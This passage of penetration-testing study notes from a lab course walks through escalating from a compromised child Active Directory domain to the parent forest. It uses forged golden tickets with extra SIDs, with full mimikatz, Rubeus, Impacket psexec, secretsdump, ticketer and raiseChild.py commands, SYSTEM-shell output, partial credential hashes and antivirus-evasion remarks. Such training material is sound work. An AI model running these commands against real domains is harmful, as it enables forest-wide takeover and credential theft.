export KRB5CCNAME=hacker.ccache

# Get SYSTEM shell on parent domain DC
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

Breaking down:

export KRB5CCNAME=hacker.ccache → environment variable
                                  tells ALL Kerberos tools
                                  to use this ccache file
                                  = our forged ticket is active

psexec.py                       → Impacket remote execution tool

LOGISTICS.INLANEFREIGHT.LOCAL/hacker
                                → child domain/fake username
                                  matches what is in our ticket

@academy-ea-dc01.inlanefreight.local
                                → target = PARENT domain DC hostname

-k                              → use Kerberos authentication
                                  = use our forged ticket

-no-pass                        → no password needed
                                  using Kerberos ticket instead

-target-ip 172.16.5.5          → parent domain DC IP

What you find:

[*] Found writable share ADMIN$
[*] Uploading file nkYjGWDZ.exe
[*] Creating service on DC

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
ACADEMY-EA-DC01

= SYSTEM shell on PARENT domain DC
= From child domain compromise
= Full forest compromise achieved
Task 21 - Automated Attack with raiseChild.py
bash
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm

What raiseChild.py does automatically:

Step 1: Finds child and parent domain FQDNs via MS-NRPC
Step 2: Gets forest FQDN
Step 3: Gets Enterprise Admins SID via MS-LSAT
Step 4: Gets child krbtgt credentials via DCSync (MS-DRSR)
Step 5: Creates Golden Ticket with EA SID in Extra SIDs
Step 6: Logs into parent domain using Golden Ticket
Step 7: Gets administrator credentials from parent domain
Step 8: Opens SYSTEM shell via psexec if -target-exec specified

What you find:

[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
[*] Forest FQDN is: INLANEFREIGHT.LOCAL
[*] Enterprise Admin SID: S-1-5-21-...-519
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:9d765b4...
INLANEFREIGHT.LOCAL/krbtgt:16e26ba3...
INLANEFREIGHT.LOCAL/administrator:88ad0918...  ← parent admin hash!

C:\Windows\system32>whoami
nt authority\system
= ONE command = full forest compromise

Why NOT to always use raiseChild.py:

raiseChild.py is convenient BUT:
→ If it fails you cannot troubleshoot
→ In production could break things unexpectedly
→ Autopwn scripts can cause unintended damage
→ Client production environment = be careful
→ Always prefer manual methods you understand

Learn manual method FIRST
Use automated tools only when you understand
exactly what each step is doing underneath
7. Complete Attack Chain Summary
STARTING POINT:
Compromised child domain admin account in LOGISTICS

FROM WINDOWS:
Step 1: DCSync krbtgt → mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
Step 2: Get child SID → Get-DomainSID
Step 3: Get EA SID → Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins"
Step 4: Confirm no access → ls \\academy-ea-dc01.inlanefreight.local\c$
Step 5: Create ticket → mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS... /sid:[child] /krbtgt:[hash] /sids:[EA_SID] /ptt
  OR
Step 5alt: Create ticket → .\Rubeus.exe golden /rc4:[hash] /domain:LOGISTICS... /sid:[child] /sids:[EA_SID] /user:hacker /ptt
Step 6: Verify ticket → klist
Step 7: Access parent → ls \\academy-ea-dc01.inlanefreight.local\c$
Step 8: DCSync parent → mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL

FROM LINUX:
Step 1: DCSync krbtgt → secretsdump.py logistics.../htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
Step 2: Get child SID → lookupsid.py ...@172.16.5.240 | grep "Domain SID"
Step 3: Get EA SID → lookupsid.py ...@172.16.5.5 | grep -B12 "Enterprise Admins"
Step 4: Create ticket → ticketer.py -nthash [hash] -domain LOGISTICS... -domain-sid [child] -extra-sid [EA_SID] hacker
Step 5: Activate ticket → export KRB5CCNAME=hacker.ccache
Step 6: SYSTEM shell → psexec.py LOGISTICS.../hacker@academy-ea-dc01... -k -no-pass -target-ip 172.16.5.5
  OR automated:
All steps → raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
8. Key Things to Remember
1. Trust enumeration = ALWAYS do after initial foothold
   Get-ADTrust, Get-DomainTrust, Get-DomainTrustMapping
   = Each tool gives different perspective
   = Together = complete trust picture

2. Get-ADTrust = built-in = works without PowerView
   Get-DomainTrust = cleaner output = attacker friendly
   Get-DomainTrustMapping = most thorough = follows chains
   netdom = when PowerShell restricted = built-in cmd tool
   = Know which to use in each situation

3. IntraForest True + SIDFiltering False = ExtraSids works
   ForestTransitive True = different forest = different attacks
   BiDirectional = can auth both ways = more attack paths

4. SID Filtering NOT applied within same forest
   = ExtraSids attack works within same forest
   = Child domain compromise = parent domain compromise
   = Forest is the security boundary NOT individual domain

5. ExtraSids needs 5 pieces of data
   krbtgt hash (child) + child SID + fake username
   + child FQDN + Enterprise Admins SID (parent)
   = Missing any one = attack fails

6. Enterprise Admins RID is ALWAYS 519
   Parent_SID-519 = Enterprise Admins SID
   = Build the EA SID yourself from domain SID

7. Golden Ticket user DOES NOT need to exist
   /user:hacker = completely fake user
   Ticket is FORGED = user never needs to be real
   = No traces in AD user database

8. Mimikatz /ptt vs Rubeus /ptt = same result
   Both inject ticket to memory
   Rubeus = C# compiled = harder for AV to detect
   Mimikatz = more features = more reconnaissance options
   = Always verify with klist after either tool

9. /domain flag required for cross-domain DCSync
   mimikatz # lsadump::dcsync /user:INLANEFREIGHT\admin /domain:INLANEFREIGHT.LOCAL
   Without /domain = might target wrong DC = fails

10. KRB5CCNAME on Linux = which ccache file to use
    export KRB5CCNAME=hacker.ccache
    Critical step on Linux or ticket not used
    All -k commands use this ticket automatically

11. raiseChild.py = automated but learn manual first
    If it fails without understanding = stuck
    Manual steps = can troubleshoot any failure
    Production environments = manual is safer

12. Always verify attack worked before and after
    ls \\parent-dc\c$ before = should fail
    ls \\parent-dc\c$ after = should succeed
    klist after creating ticket = confirms ticket in memory
    = Proof that attack worked for your report


